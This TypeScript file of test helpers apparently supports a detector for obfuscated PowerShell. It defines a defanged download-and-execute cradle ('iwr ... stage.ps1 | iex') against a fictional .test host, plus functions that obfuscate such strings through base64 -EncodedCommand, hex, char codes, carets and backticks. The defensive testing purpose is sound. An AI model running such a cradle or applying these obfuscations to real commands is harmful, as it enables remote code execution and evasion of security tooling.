// Test helpers. Every sample is defanged: hosts are fictional *.test names
// that never resolve, and nothing here is ever executed.

export const LURE_HOST = 'example-lure.test';
export const STAGE = `iwr https://${LURE_HOST}/stage.ps1 | iex`;

/** PowerShell -EncodedCommand form: base64 of UTF-16LE. */
export const encodePs = (s: string): string => Buffer.from(s, 'utf16le').toString('base64');
export const encodeUtf8 = (s: string): string => Buffer.from(s, 'utf8').toString('base64');
export const toHex = (s: string): string => Buffer.from(s, 'utf8').toString('hex');
export const charCodes = (s: string): string => [...s].map((c) => `[char]${c.charCodeAt(0)}`).join('+');
export const caret = (s: string): string => [...s].map((c) => (/[a-z]/i.test(c) ? `${c}^` : c)).join('').replace(/\^(\s|$)/g, '$1');
export const backtick = (s: string): string => s.replace(/([a-z])([a-z])/gi, '$1`$2');
